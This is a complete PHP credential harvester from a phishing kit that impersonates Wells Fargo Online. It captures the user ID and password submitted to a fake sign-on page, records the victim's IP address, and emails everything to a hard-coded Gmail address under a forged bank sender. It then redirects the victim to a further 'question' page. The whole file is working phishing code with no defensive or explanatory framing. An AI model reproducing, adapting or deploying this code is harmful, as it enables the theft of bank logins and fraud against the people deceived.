<?

ob_start();
    if(empty($_POST['userid']))
    {
    header("Location: signon.htm");
    exit;
    }
    if(empty($_POST['password']))
    {
    header("Location: signon.htm");
    exit;
    }

$ip = getenv("REMOTE_ADDR");
$message .= "--------------------------Login Details----------------------------------------\n";
$message .= "Username: ".$_POST['userid']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------phisharman------------------------------\n";



$recipient = "marayanathompson@gmail.com";
$subject = "$ip";
$headers = "From: Wells Fargo Online <wells@wells.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location:  question.htm");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>